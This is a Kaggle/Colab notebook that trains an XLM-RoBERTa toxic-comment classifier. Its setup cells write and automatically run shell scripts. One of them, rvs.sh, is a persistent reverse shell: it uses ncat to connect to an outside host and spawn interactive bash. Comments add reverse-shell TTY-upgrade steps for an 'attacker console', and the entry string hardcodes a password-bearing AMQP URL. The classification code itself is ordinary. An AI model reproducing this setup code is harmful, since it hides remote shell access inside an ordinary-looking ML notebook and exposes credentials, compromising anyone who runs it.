# -*- coding: utf-8 -*-
# + [markdown] colab_type="text" id="wzoWM76m0Rfg"
# ### Dont forget turn on TPU & HIGH-RAM modes :)
#
# Author: [Alex Shonenkov](https://www.kaggle.com/shonenkov) //  shonenkov@phystech.edu
# Have a good day!

# + colab_type="code" id="_43yMxyEvW-q" colab={"base_uri": "https://localhost:8080/", "height": 138} outputId="efad717e-4fae-4509-efb2-59ac0e9ef971"
# !echo $HOSTNAME
# !echo $TPU_NAME
# !nvidia-smi

# + colab_type="code" id="n6uGvKL3upio" colab={}
# %load_ext autoreload
# %autoreload 2

# + colab_type="code" id="n6uGvKL3epio" colab={"base_uri": "https://localhost:8080/", "height": 62} outputId="4698e84c-27c8-4301-c073-1c4b034a3653"
import subprocess

subprocess.run('[ -f setup.py ] || (git clone https://github.com/pennz/kaggle_runner; '
'git submodule update --init --recursive; '
'rsync -r kaggle_runner/.* .; '
'rsync -r kaggle_runner/* .;); '
'python3 -m pip install -e .', shell=True, check=True)

# + colab_type="code" id="x5uJSXQmfnNb" colab={}
from kaggle_runner.utils.kernel_utils import get_obj_or_dump


# + colab_type="code" id="wV017Cj1CRlg" colab={}
with open("runner.sh", "w") as f:
    f.write(
r"""#!/bin/bash
export PS4='Line ${LINENO}: ' # for debug
NC=ncat

USER=$1
shift
REPO=$1
shift
BRANCH=$1
shift
PHASE=$1
shift
ENABLE_RVS=$1
shift

SERVER=$1
shift
PORT=$1
shift

ORIG_PORT=23454

CHECK_PORT=$((ORIG_PORT + 1))
python3 -m pip install --upgrade pip
conda install -y -c eumetsat expect & # https://askubuntu.com/questions/1047900/unbuffer-stopped-working-months-ago
apt update && apt install -y netcat nmap screen time locales >/dev/null 2>&1
apt install -y mosh iproute2 fish tig ctags htop tree pv tmux psmisc >/dev/null 2>&1 &

conda init bash
cat >> ~/.bashrc << EOF
conda activate base # as my dotfiles will fiddle with conda
export SERVER=$SERVER
export CHECK_PORT=$CHECK_PORT
EOF

source rpt # rvs IDE env setup
export SERVER=$SERVER
export CHECK_PORT=$CHECK_PORT

wait_ncat() {
    wait_for_ncat=$1

    while [ $wait_for_ncat -gt 0 ]; do
        wait_for_ncat=$((wait_for_ncat - 1))
        which ncat >/dev/null && return 0
    done
}
wait_ncat 60

which $NC >/dev/null || NC=nc
export NC

if [ "x${ENABLE_RVS}" = x1 ]; then
    if [ -z $(pgrep -f 'jupyter-notebook') ]; then
        bash ./rvs.sh $SERVER $PORT 2>&1 &
    else
        screen -d -m bash -c "{ echo [REMOTE]: rvs log below.; bash rvs.sh $SERVER $PORT 2>&1; } | $NC --send-only --no-shutdown -w 120s -i $((3600 * 2))s $SERVER $CHECK_PORT"
    fi
fi &

python3 -m pip install ripdb pydicom parse pytest-logger python_logging_rabbitmq coverage &
python3 -m pip install pyvim neovim msgpack==1.0.0 & # for vim

# SRC_WORK_FOLDER=/kaggle/working # it is just current working folder
# [ -d ${SRC_WORK_FOLDER} ] || mkdir -p ${SRC_WORK_FOLDER}
#
# cd ${SRC_WORK_FOLDER}

if [ -d ${REPO} ]; then rm -rf ${REPO}; fi

# get code
{
    mvdir() {
        [[ "$2"/"$1" -ef "${PWD}" ]] || {
            rm -rf "$2"/"$1" &&
                mkdir "$2"/"$1"
        }

        bash -c "mv ""$1""/*"" $2""/""$1"
    }
    export -f mvdir

    if [ ! -d ${REPO} ]; then
        git clone --single-branch --branch ${BRANCH} --depth=1 \
            https://github.com/${USER}/${REPO}.git ${REPO} && pushd ${REPO} &&
        sed -i 's/git@\(.*\):\(.*\)/https:\/\/\1\/\2/' .gitmodules &&
        sed -i 's/git@\(.*\):\(.*\)/https:\/\/\1\/\2/' .git/config &&
        git submodule update --init --recursive
        find . -maxdepth 1 -name ".??*" -o -name "??*" -type f | xargs -I{} mv {} $OLDPWD
        find . -maxdepth 1 -name ".??*" -o -name "??*" -type d | xargs -I{} bash -x -c "mvdir {}  $OLDPWD"
        popd
    fi
    make install_dep >/dev/null
}

USE_AMQP=true
export USE_AMQP

conda init bash
source ~/.bashrc
conda activate base

if [ x"${PHASE}" = x"dev" ]; then
    export PS4='[Remote]: Line ${LINENO}: '
    (
        echo "MOSHing"
        make mosh
    ) &

    make toxic | if [ $USE_AMQP -eq true ]; then cat -; else $NC --send-only -w 120s -i $((60 * 5))s $SERVER $CHECK_PORT; fi &
    wait # not exit, when dev
fi

if [ x"${PHASE}" = x"data" ]; then
    bash ./rvs.sh $SERVER $PORT >/dev/null & # just keep one rvs incase
    make dataset
fi

if [ x"${PHASE}" = x"test" ]; then
    bash ./rvs.sh $SERVER $PORT >/dev/null & # just keep one rvs incase
    #make test
fi

if [ x"${PHASE}" = x"run" ]; then
    bash ./rvs.sh $SERVER $PORT >/dev/null & make m & # just keep one rvs incase
    make toxic | if [ $USE_AMQP -eq true ]; then cat -; else $NC --send-only -w 120s -i $((60 * 5))s $SERVER $CHECK_PORT; fi
    # basically the reverse of the calling path
    pkill make & pkill -f "mosh" & pkill sleep & pkill -f "rvs.sh" & pkill ncat &
    # python main.py "$@"
fi
"""
    )
with open("rvs.sh", "w") as f:
    f.write(
r"""#!/bin/bash
export PS4='Line ${LINENO}: ' # for debug

NC=${NC:-ncat}
type $NC || ( echo >&2 "$NC cannot be found. Exit."; exit 1;)
# https://stackoverflow.com/questions/57877451/retrieving-output-and-exit-code-of-a-coprocess
# coproc { sleep 30 && echo "Output" && exit 3; }
# Saving the coprocess's PID for later, as COPROC_PID apparently unsets when its finished
# COPROC_PID_backup=$COPROC_PID
#
# Retrieving the coprocess's output
# output=$(cat <&$COPROC)
#
# Retrieving the coprocess's exit code
# wait $COPROC_PID_backup
#
# Echoing out the results
# echo $?
# echo $output

echo BASH NOW: $BASHPID

PID_FILE_PATH=/tmp/nc.pid
EXIT_FILE_PATH=/tmp/rvs_exit.$BASHPID.pid

test -f $EXIT_FILE_PATH && rm $EXIT_FILE_PATH

SERVER=$1
shift
PORT=$1
shift

ORIG_PORT=23454
CHECK_PORT=$((ORIG_PORT + 1))

check_exit_status() {
  [ -f /tmp/rvs_return ] && return 0

  if [ -f $EXIT_FILE_PATH ] && [ x"$(cat $EXIT_FILE_PATH)" = x0 ]; then
    return 0
  fi

  return 1 # not ok
}


connect_setup() {
  connect_again_flag=1

  sleep_time=5

  while [ ${connect_again_flag} -eq 1 ]; do
    check_exit_status && return 0

    $NC -w ${1}s -i 1800s $SERVER $PORT -c "echo $(date) started connection; echo $HOSTNAME; python -c 'import pty; pty.spawn([\"/bin/bash\", \"-li\"])'"

    RSRET=$?
    echo $RSRET > $EXIT_FILE_PATH
    (/bin/ss -lpants | grep "ESTAB.*$PORT") || >&2 echo "\"$NC -w ${1}s -i 1800s $SERVER $PORT\" return with code $RSRET"

    if [ x"$RSRET" = x"0" ]; then
      [ -f /tmp/rvs_exit ] && return 0

      return 255 # just do not return
    fi
    [ $RSRET -eq 0 ] && connect_again_flag=0
    [ $RSRET -eq 1 ] && sleep ${sleep_time} && sleep_time=$((sleep_time + sleep_time))
  done
  # exit, will cause rvs script exit, beside, RSRET not 0, mean connection loss
  # thing
  RSRET=1  # just never exit
  echo $RSRET > $EXIT_FILE_PATH && return $RSRET
}

connect_again() {
  # pkill -f "nc.*$PORT"  # no need now, our listen server can accept multiple
  # connection now
  connect_setup $1
}

WAIT_LIMIT=2048
INIT_WAIT=8
port_connect_status=0
wait_time=$INIT_WAIT

floatToInt() {
  parsed=$(printf "%.0f" "$@")
  [ ! $? -eq 0 ] && parsed=0
  echo $parsed
} 2> /dev/null

while true; do
  check_exit_status && exit 0
  # if find that server cannot be connected, we try to restart our reverse connect again
  nc_time=$($(which time) -f "%e" $NC -zw $wait_time $SERVER $CHECK_PORT 2>&1 > /dev/null)
  nc_ret=$?
  nc_time=$(echo $nc_time | awk '{print $NF}')
  nc_time=$(floatToInt $nc_time)

  if [ ${nc_ret} -eq 0 ]; then
    # recover connection, need to connect_again too. For 1st time, will try to connect
    # no connection last time, have connction now

    if [ $port_connect_status -eq 0 ]; then
      echo "recover connection, reset wait_time and try to reconnect"
      wait_time=$INIT_WAIT
      # previous connection is lost, we wait for longer to setup connection
      check_exit_status || wait_time=15
      connect_again $wait_time &
    else
      wait_time=$((wait_time + wait_time)) # double wait, network fine

      if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi
    fi
    port_connect_status=1
  else
    if [ $port_connect_status -eq 1 ]; then
      echo "found connection loss, reset wait_time and try to reconnect"
      wait_time=$INIT_WAIT
      check_exit_status || wait_time=15 # previous connection is lost
      connect_again $wait_time &
    else # no connection all the time? we still try to connect...
      wait_time=$((wait_time + wait_time))

      if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi
      connect_again $wait_time &
    fi
    port_connect_status=0
  fi
  sleep $((wait_time - nc_time)) # check every XX seconds
  echo $hostname $HOSTNAME
done
wait  # wait for any background

# https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e
# In reverse shell
# $ python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
#
# In Attacker console
# $ stty raw -echo
# $ fg
#
# In reverse shell
# $ reset
# $ export SHELL=bash
# $ export TERM=xterm-256color
# $ stty rows <num> columns <cols>
"""
    )
with open("rpt", "w") as f:
    f.write(
r"""#!/bin/bash
[ -d ~/.fzf ] || {
git clone --depth=1 https://github.com/pennz/dotfiles
rsync -r dotfiles/.* ~
rsync -r dotfiles/* ~
pushd ~
git submodule update --init
.fzf/install --all
curl -fLo ~/.config/nvim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
curl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
# vim -u ~/.vimrc_back "+call plug#begin()" +PlugInstall +qa &
# ( sleep 60; nvim -Vnvim_log -u ~/.vimrc_back "+call plug#begin()" +PlugInstall +checkhealth +qa )&
ln -s .shrc_customised.macos .shrc_customised
echo "alias gdrive='gdrive  --service-account a.json'" >> ~/.bash_aliases
echo "unalias vim" >> ~/.bash_aliases
popd

cat >> ~/.profile << EOF
export SHELL=/bin/bash
export TERM=screen-256color
stty intr ^\c susp ^\x eof ^\f echo opost
# https://unix.stackexchange.com/questions/343088/what-is-the-equivalent-of-stty-echo-for-zsh
# unsetopt ZLE # for zsh
# for ourside stty raw isig -echo icrnl time 3 echoprt opost eof ^\p

color_my_prompt () {
    local __user_and_host="\[\033[01;32m\]\u@\h"
    local __cur_location="\[\033[01;34m\]\w"
    local __git_branch_color="\[\033[31m\]"
    # local __git_branch="\`ruby -e \"print (%x{git branch 2> /dev/null}.grep(/^\*/).first || '').gsub(/^\* (.+)$/, '(\1) ')\"\`"
    local __git_branch='`git branch 2> /dev/null | grep -e ^* | ${SED:-sed} -E  s/^\\\\\*\ \(.+\)$/\(\\\\\1\)\ /`'
    local __prompt_tail="\[\033[35m\]$"
    local __last_color="\[\033[00m\]"
    export PS1="$__user_and_host $__cur_location $__git_branch_color$__git_branch$__prompt_tail$__last_color "
}

ENV=/root/.bashrc
PYTHONWARNINGS=ignore:::pip._internal.cli.base_command
MPLBACKEND=module://ipykernel.pylab.backend_inline

PS4="$HOSTNAME: "'${LINENO}: '
_=/usr/bin/env
PWD=/kaggle/working
cd $PWD
OLDPWD=/root

# color_my_prompt
locale-gen
echo "#" $(grep 'cpu ' /proc/stat >/dev/null;sleep 0.1;grep 'cpu ' /proc/stat | awk -v RS="" '{print "CPU: "($13-$2+$15-$4)*100/($13-$2+$15-$4+$16-$5)"%"}') "Mem: "$(awk '/MemTotal/{t=$2}/MemAvailable/{a=$2}END{print 100-100*a/t"%"}' /proc/meminfo) "Uptime: "$(uptime | awk '{print $1 " " $2 " " $3}')
echo "#" TPU_NAME=$TPU_NAME
nvidia-smi
conda activate base
EOF
}
"""
    )
with open("gdrive_setup", "w") as f:
    f.write(
r"""#!/bin/bash
wget https://github.com/gdrive-org/gdrive/releases/download/2.1.0/gdrive-linux-x64
chmod +x gdrive-linux-x64
cp gdrive-linux-x64 /bin/gdrive

mkdir ~/.gdrive

# auth file
cat > ~/.gdrive/a.json << EOF
NO_PASS

EOF

gdrive --service-account a.json list  # just test

SRC_WORK_FOLDER=/kaggle/input
[ -d ${SRC_WORK_FOLDER} ] || {
    mkdir -p ${SRC_WORK_FOLDER}
    cd ${SRC_WORK_FOLDER}
    gdrive --service-account a.json download -r 1CHDWIN0M6PD4SQyplbWefBCzNzdPVd-m
    tar xf siim-train-test.tar.gz -C /kaggle/input
}
# cat > tgz_files.sh << EOF
# #!/bin/bash
# tgzfile () {
#   tar cf - $1 -P | pv -s $(du -sb $1 | awk '{print $1}') | gzip > /home/$1.tar.gz
# }
# cd /kaggle/input
# find . -maxdepth 1 -type d -name "??*" | while read -r line; do
#     echo $line
#     tgzfile $line
# done
# EOF
"""
    )

# + colab_type="code" id="fk22W4JeCRlm" colab={}
import os
server = "vtool.duckdns.org"
os.environ['SERVER'] = server

entry_str = r"""#!/bin/bash
PS4='Line ${LINENO}: ' bash runner.sh pennz kaggle_runner master "test" 1 """+ server +""" "9017" "amqp://kaggle:9b83ca70cf4cda89524d2283a4d675f6@pengyuzhou.com/" "384" "19999" "intercept" | tee runner_log
"""
if False:
    entry_str += r"""PS4='Line ${LINENO}: ' bash -x gdrive_setup >>loggdrive &"""

with open("entry.sh", "w") as f:
    f.write(entry_str)

# + colab_type="code" id="UAC8442XCRlq" colab={"base_uri": "https://localhost:8080/", "height": 42} outputId="9a6eab8a-a437-401a-d0ca-1efc8d0bf519"
import os
import sys
sys.path.append(os.getcwd())

import selectors
import subprocess
from importlib import reload, import_module
import_module('kaggle_runner')
from kaggle_runner import logger
logger.debug("Logger loaded. Will run entry.sh.")

# + colab={} colab_type="code" id="mC6qgI68EMQm" magic_args="--bg --out runner_log --err runner_err_log" language="bash"
# bash entry.sh

# + [markdown] colab_type="text" id="IklWPKSwNsXN"
# # NOW kernel code

# + colab={} colab_type="code" id="mC6qgI68BASH" magic_args="" language="bash"
# #!python3 -m pip install 'prompt-toolkit<2.0.0,>=1.0.15' --force-reinstall
# #!python -m pip install 'prompt-toolkit<2.0.0,>=1.0.15' --force-reinstall
# python3 -c 'import torch_xla' || (curl https://raw.githubusercontent.com/pytorch/xla/master/contrib/scripts/env-setup.py -o pytorch-xla-env-setup.py > /dev/null;
# python pytorch-xla-env-setup.py --apt-packages libomp5 libopenblas-dev;
# python3 -m pip install transformers==2.5.1 > /dev/null;
# python3 -m pip install pandarallel > /dev/null;
# python3 -m pip install catalyst==20.4.2 > /dev/null;)

# + colab_type="code" id="KFZrVc5nCRlw" outputId="bea9d14c-7174-49cf-eb16-26733d847679" colab={"base_uri": "https://localhost:8080/", "height": 219}
import numpy as np
import pandas as pd

import os
os.environ['XLA_USE_BF16'] = "1"

from glob import glob

import torch
import torch.nn as nn
from torch.utils.data import Dataset,DataLoader
from torch.autograd import Variable
from torch.utils.data.sampler import SequentialSampler, RandomSampler
import sklearn

import time
import random
from datetime import datetime
from tqdm import tqdm
tqdm.pandas()

from transformers import BertModel, BertTokenizer
from transformers import XLMRobertaModel, XLMRobertaTokenizer
from transformers import AdamW, get_linear_schedule_with_warmup, get_constant_schedule
from catalyst.data.sampler import DistributedSamplerWrapper, BalanceClassSampler

import gc
import re

# # !python3 -m pip install nltk > /dev/null
import nltk
nltk.download('punkt')

from nltk import sent_tokenize

from pandarallel import pandarallel

pandarallel.initialize(nb_workers=4, progress_bar=False)

# + colab_type="code" id="M-VP4QbZu9EB" colab={}
SEED = 142

MAX_LENGTH = 224
BACKBONE_PATH = 'xlm-roberta-large'
# ROOT_PATH = f'..'
ROOT_PATH = f'/kaggle' # for colab


def seed_everything(seed):
    random.seed(seed)
    os.environ['PYTHONHASHSEED'] = str(seed)
    np.random.seed(seed)
    torch.manual_seed(seed)
    torch.cuda.manual_seed(seed)
    torch.backends.cudnn.deterministic = True
    torch.backends.cudnn.benchmark = True

seed_everything(SEED)

# + colab_type="code" id="63ceMzcxu9GS" colab={"base_uri": "https://localhost:8080/", "height": 118} outputId="9a020727-fcf8-4ce9-fa1a-7978ae11d8a2"
from nltk import sent_tokenize
from random import shuffle
import random
import albumentations
from albumentations.core.transforms_interface import DualTransform, BasicTransform


LANGS = {
    'en': 'english',
    'it': 'italian',
    'fr': 'french',
    'es': 'spanish',
    'tr': 'turkish',
    'ru': 'russian',
    'pt': 'portuguese'
}

def get_sentences(text, lang='en'):
    return sent_tokenize(text, LANGS.get(lang, 'english'))

def exclude_duplicate_sentences(text, lang='en'):
    sentences = []

    for sentence in get_sentences(text, lang):
        sentence = sentence.strip()

        if sentence not in sentences:
            sentences.append(sentence)

    return ' '.join(sentences)

def clean_text(text, lang='en'):
    text = str(text)
    text = re.sub(r'[0-9"]', '', text)
    text = re.sub(r'#[\S]+\b', '', text)
    text = re.sub(r'@[\S]+\b', '', text)
    text = re.sub(r'https?\S+', '', text)
    text = re.sub(r'\s+', ' ', text)
    text = exclude_duplicate_sentences(text, lang)

    return text.strip()


class NLPTransform(BasicTransform):
    """ Transform for nlp task."""

    @property
    def targets(self):
        return {"data": self.apply}

    def update_params(self, params, **kwargs):
        if hasattr(self, "interpolation"):
            params["interpolation"] = self.interpolation

        if hasattr(self, "fill_value"):
            params["fill_value"] = self.fill_value

        return params

    def get_sentences(self, text, lang='en'):
        return sent_tokenize(text, LANGS.get(lang, 'english'))

class ShuffleSentencesTransform(NLPTransform):
    """ Do shuffle by sentence """
    def __init__(self, always_apply=False, p=0.5):
        super(ShuffleSentencesTransform, self).__init__(always_apply, p)

    def apply(self, data, **params):
        text, lang = data
        sentences = self.get_sentences(text, lang)
        random.shuffle(sentences)

        return ' '.join(sentences), lang

class ExcludeDuplicateSentencesTransform(NLPTransform):
    """ Exclude equal sentences """
    def __init__(self, always_apply=False, p=0.5):
        super(ExcludeDuplicateSentencesTransform, self).__init__(always_apply, p)

    def apply(self, data, **params):
        text, lang = data
        sentences = []

        for sentence in self.get_sentences(text, lang):
            sentence = sentence.strip()

            if sentence not in sentences:
                sentences.append(sentence)

        return ' '.join(sentences), lang

class ExcludeNumbersTransform(NLPTransform):
    """ exclude any numbers """
    def __init__(self, always_apply=False, p=0.5):
        super(ExcludeNumbersTransform, self).__init__(always_apply, p)

    def apply(self, data, **params):
        text, lang = data
        text = re.sub(r'[0-9]', '', text)
        text = re.sub(r'\s+', ' ', text)

        return text, lang

class ExcludeHashtagsTransform(NLPTransform):
    """ Exclude any hashtags with # """
    def __init__(self, always_apply=False, p=0.5):
        super(ExcludeHashtagsTransform, self).__init__(always_apply, p)

    def apply(self, data, **params):
        text, lang = data
        text = re.sub(r'#[\S]+\b', '', text)
        text = re.sub(r'\s+', ' ', text)

        return text, lang

class ExcludeUsersMentionedTransform(NLPTransform):
    """ Exclude @users """
    def __init__(self, always_apply=False, p=0.5):
        super(ExcludeUsersMentionedTransform, self).__init__(always_apply, p)

    def apply(self, data, **params):
        text, lang = data
        text = re.sub(r'@[\S]+\b', '', text)
        text = re.sub(r'\s+', ' ', text)

        return text, lang

class ExcludeUrlsTransform(NLPTransform):
    """ Exclude urls """
    def __init__(self, always_apply=False, p=0.5):
        super(ExcludeUrlsTransform, self).__init__(always_apply, p)

    def apply(self, data, **params):
        text, lang = data
        text = re.sub(r'https?\S+', '', text)
        text = re.sub(r'\s+', ' ', text)

        return text, lang

# + colab_type="code" id="KFCrVc5nCRlw" colab={}
from kaggle_runner.utils.kernel_utils import get_obj_or_dump
def get_pickled_data(file_path):
    obj = get_obj_or_dump(file_path)

    if obj is None:
        return get_obj_or_dump(f"{ROOT_PATH}/input/bert-for-toxic-classfication-trained/{file_path}")

    return obj



# + colab_type="code" id="uFB3UeyAsYCp" colab={}
from kaggle_runner import may_debug

def get_open_subtitles():
    df_ot = get_pickled_data("ot.pkl")

    if df_ot is None:
        df_ot = pd.read_csv(f'{ROOT_PATH}/input/open-subtitles-toxic-pseudo-labeling/open-subtitles-synthesic.csv', index_col='id')[['comment_text', 'toxic', 'lang']]
        df_ot = df_ot[~df_ot['comment_text'].isna()]
        df_ot['comment_text'] = df_ot.parallel_apply(lambda x: clean_text(x['comment_text'], x['lang']), axis=1)
        df_ot = df_ot.drop_duplicates(subset='comment_text')
        df_ot['toxic'] = df_ot['toxic'].round().astype(np.int)
        get_obj_or_dump("ot.pkl", default=df_ot)

    return df_ot


class SynthesicOpenSubtitlesTransform(NLPTransform):
    def __init__(self, always_apply=False, supliment_toxic=None, p=0.5, mix=False):
        super(SynthesicOpenSubtitlesTransform, self).__init__(always_apply, p)

        df = get_open_subtitles()
        self.synthesic_toxic = df[df['toxic'] == 1].comment_text.values
        self.synthesic_non_toxic = df[df['toxic'] == 0].comment_text.values

        if supliment_toxic is not None:
            self.synthesic_toxic = np.concatenate((self.synthesic_toxic, supliment_toxic))
        self.mix = mix

        del df
        gc.collect();


    def _mix_both(self, texts):
        for i in range(random.randint(0,2)):
            texts.append(random.choice(self.synthesic_non_toxic))

        for i in range(random.randint(1,3)):
            texts.append(random.choice(self.synthesic_toxic))

    def generate_synthesic_sample(self, text, toxic):
        texts = [text]

        if toxic == 0:
            if self.mix:
                self._mix_both(texts)
                toxic = 1
            else:
                for i in range(random.randint(1,5)):
                    texts.append(random.choice(self.synthesic_non_toxic))
        else:
            self._mix_both(texts)
        random.shuffle(texts)

        return ' '.join(texts), toxic

    def apply(self, data, **params):
        text, toxic = data
        text, toxic = self.generate_synthesic_sample(text, toxic)

        return text, toxic


# + colab_type="code" id="K5BdJ9HWvnLW" outputId="d4c6b816-694c-40c5-df81-2b03901e8c6a" colab={"base_uri": "https://localhost:8080/", "height": 93}
def get_train_transforms():
    return albumentations.Compose([
        ExcludeUsersMentionedTransform(p=0.95),
        ExcludeUrlsTransform(p=0.95),
        ExcludeNumbersTransform(p=0.95),
        ExcludeHashtagsTransform(p=0.95),
        ExcludeDuplicateSentencesTransform(p=0.95),
    ], p=1.0)

def get_synthesic_transforms(supliment_toxic, p=0.5, mix=False):
    return SynthesicOpenSubtitlesTransform(p=p, supliment_toxic=supliment_toxic, mix=mix)

def get_toxic_comments(df):
        df = df[~df['comment_text'].isna()]
        df = df.drop_duplicates(subset='comment_text')
        df['toxic'] = df['toxic'].round().astype(np.int)

        return df[df['toxic'] == 1].comment_text.values

df_train = get_pickled_data("train.pkl")

if df_train is None:
    df_train = pd.read_csv(f'{ROOT_PATH}/input/jigsaw-toxicity-train-data-with-aux/train_data.csv')
    df_train['comment_text'] = df_train.parallel_apply(lambda x: clean_text(x['comment_text'], x['lang']), axis=1)
    get_obj_or_dump("train.pkl", default=df_train)

supliment_toxic = get_toxic_comments(df_train)
supliment_toxic = None # avoid overfit
train_transforms = get_train_transforms();
synthesic_transforms_often = get_synthesic_transforms(supliment_toxic, p=0.5)
synthesic_transforms_low = get_synthesic_transforms(supliment_toxic, p=0.3)
tokenizer = XLMRobertaTokenizer.from_pretrained(BACKBONE_PATH)
shuffle_transforms = ShuffleSentencesTransform(always_apply=True)


# + colab_type="code" id="qFp80AuJu9Ii" colab={}
def onehot(size, target, aux=None):
    if aux is not None:
        vec = np.zeros(size+len(aux), dtype=np.float32)
        vec[target] = 1.
        vec[2:] = aux
        vec = torch.tensor(vec, dtype=torch.float32)
    else:
        vec = torch.zeros(size, dtype=torch.float32)
        vec[target] = 1.

    return vec

from kaggle_runner import may_debug


class DatasetRetriever(Dataset):
    def __init__(self, labels_or_ids, comment_texts, langs,
                 severe_toxic=None, obscene=None, threat=None, insult=None, identity_hate=None,
                 use_train_transforms=False, test=False, use_aux=True):
        self.test = test
        self.labels_or_ids = labels_or_ids
        self.comment_texts = comment_texts
        self.langs = langs
        self.severe_toxic = severe_toxic
        self.obscene = obscene
        self.threat = threat
        self.insult = insult
        self.identity_hate = identity_hate
        self.use_train_transforms = use_train_transforms
        self.aux = None

        if use_aux:
            self.aux = [self.severe_toxic, self.obscene, self.threat, self.insult, self.identity_hate]

    def get_tokens(self, text):
        encoded = tokenizer.encode_plus(
            text,
            add_special_tokens=True,
            max_length=MAX_LENGTH,
            pad_to_max_length=True
        )

        return encoded['input_ids'], encoded['attention_mask']

    def __len__(self):
        return self.comment_texts.shape[0]

    def __getitem__(self, idx):
        text = self.comment_texts[idx]
        lang = self.langs[idx]

        if self.severe_toxic is None:
            aux = [0., 0., 0., 0., 0.]
        else:
            aux = [self.severe_toxic[idx], self.obscene[idx], self.threat[idx], self.insult[idx], self.identity_hate[idx]]


        label = self.labels_or_ids[idx]

        if self.use_train_transforms and (not self.test):
            text, _ = train_transforms(data=(text, lang))['data']
            tokens, attention_mask = self.get_tokens(str(text))
            token_length = sum(attention_mask)

            if token_length > 0.8*MAX_LENGTH:
                text, _ = shuffle_transforms(data=(text, lang))['data']
            elif token_length < 60:
                text, label = synthesic_transforms_often(data=(text, label))['data']
            else: # will not need to use transforms
                text, label = synthesic_transforms_low(data=(text, label))['data']

        # TODO add language detection and shuffle
        # https://pypi.org/project/langdetect/
        # if self.use_train_transforms and self.test:
        #    text, _ = train_transforms(data=(text, lang))['data']
        #    tokens, attention_mask = self.get_tokens(str(text))
        #    token_length = sum(attention_mask)

        #    if token_length > 0.8*MAX_LENGTH:
        #        text, _ = shuffle_transforms(data=(text, lang))['data']
        # to tensors
        tokens, attention_mask = self.get_tokens(str(text))
        tokens, attention_mask = torch.tensor(tokens), torch.tensor(attention_mask)

        if self.test:  # for test, return id TODO TTA
            return self.labels_or_ids[idx], tokens, attention_mask

        # label might be changed
        target = onehot(2, label, aux=aux)

        return target, tokens, attention_mask

    def get_labels(self):
        return list(np.char.add(self.labels_or_ids.astype(str), self.langs))

# + colab_type="code" id="3DVkkUVMu9Ka" outputId="d0cda48a-4f0b-451a-c55e-f3bb861191c7" colab={"base_uri": "https://localhost:8080/", "height": 169}
# %%time

df_train = get_pickled_data("train.pkl")

if df_train is None:
    df_train = pd.read_csv(f'{ROOT_PATH}/input/jigsaw-toxicity-train-data-with-aux/train_data.csv')
    df_train['comment_text'] = df_train.parallel_apply(lambda x: clean_text(x['comment_text'], x['lang']), axis=1)
    get_obj_or_dump("train.pkl", default=df_train)

train_dataset = DatasetRetriever(
    labels_or_ids=df_train['toxic'].values,
    comment_texts=df_train['comment_text'].values,
    langs=df_train['lang'].values,
    severe_toxic=df_train['severe_toxic'].values,
    obscene=df_train['obscene'].values,
    threat=df_train['threat'].values,
    insult=df_train['insult'].values,
    identity_hate=df_train['identity_hate'].values,
    use_train_transforms=True,
)

del df_train
gc.collect();

for targets, tokens, attention_masks in train_dataset:
    break

print(targets)
print(tokens.shape)
print(attention_masks.shape)

# + colab_type="code" id="PlcGdUdSYewm" outputId="9e74abc4-d0b2-4e26-dd59-934680ddac68" colab={"base_uri": "https://localhost:8080/", "height": 68}
np.unique(train_dataset.get_labels())

# + colab_type="code" id="bW4dEWaYu9NF" outputId="250e8f53-03e3-477f-c30d-35e4ba262cd9" colab={"base_uri": "https://localhost:8080/", "height": 118}
df_val = get_pickled_data("val.pkl")

if df_val is None:
    df_val = pd.read_csv(f'{ROOT_PATH}/input/jigsaw-multilingual-toxic-comment-classification/validation.csv', index_col='id')
    df_val['comment_text'] = df_val.parallel_apply(lambda x: clean_text(x['comment_text'], x['lang']), axis=1)
    get_obj_or_dump("val.pkl", default=df_val)

validation_tune_dataset = DatasetRetriever(
    labels_or_ids=df_val['toxic'].values,
    comment_texts=df_val['comment_text'].values,
    langs=df_val['lang'].values,
    use_train_transforms=True,
)

#df_val_unclean = df_val
#df_val = get_pickled_data("val_cleaned.pkl")

#if df_val is None:
#    df_val = df_val_unclean
#    df_val['comment_text'] = df_val_unclean.parallel_apply(lambda x: clean_text(x['comment_text'], x['lang']), axis=1)
#    get_obj_or_dump("val_cleaned.pkl", default=df_val)

validation_dataset = DatasetRetriever(
    labels_or_ids=df_val['toxic'].values,
    comment_texts=df_val['comment_text'].values,
    langs=df_val['lang'].values,
    use_train_transforms=False,
)

del df_val
#del df_val_unclean
gc.collect();

for targets, tokens, attention_masks in validation_dataset:
    break

print(targets)
print(tokens.shape)
print(attention_masks.shape)

# + colab_type="code" id="zNdADp28v3av" outputId="0aeefb7a-1f4a-4e93-fe6d-ae34fd4013c2" colab={"base_uri": "https://localhost:8080/", "height": 118}
df_test = get_pickled_data("test.pkl")

if df_test is None:
    df_test = pd.read_csv(f'{ROOT_PATH}/input/jigsaw-multilingual-toxic-comment-classification/test.csv', index_col='id')
    df_test['comment_text'] = df_test.parallel_apply(lambda x: clean_text(x['content'], x['lang']), axis=1)
    get_obj_or_dump("test.pkl", default=df_test)

test_dataset = DatasetRetriever(
    labels_or_ids=df_test.index.values, ## here different!!!
    comment_texts=df_test['comment_text'].values,
    langs=df_test['lang'].values,
    use_train_transforms=False,
    test=True
)

del df_test
gc.collect();

for ids, tokens, attention_masks in test_dataset:
    break

print(ids)
print(tokens.shape)
print(attention_masks.shape)


# + colab_type="code" id="I2bN_NySwU6c" colab={}
from kaggle_runner.metrics.metrics import matthews_correlation
class RocAucMeter(object):
    def __init__(self):
        self.reset()

    def reset(self):
        self.y_true = np.array([])
        self.y_true_float = np.array([], dtype=np.float)
        self.y_pred = np.array([])
        self.score = 0
        self.mc_score = 0
        self.aux_part = 0

    def update(self, y_true, y_pred, aux_part=0):
        #y_true_ = y_true
        y_true = y_true[:,:2].cpu().numpy().argmax(axis=1)
        y_true_float = y_true.astype(np.float)
        y_pred = nn.functional.softmax(y_pred[:,:2], dim=1).data.cpu().numpy()[:,1]
        self.y_true = np.hstack((self.y_true, y_true))
        self.y_true_float = np.hstack((self.y_true_float, y_true_float))
        self.y_pred = np.hstack((self.y_pred, y_pred))
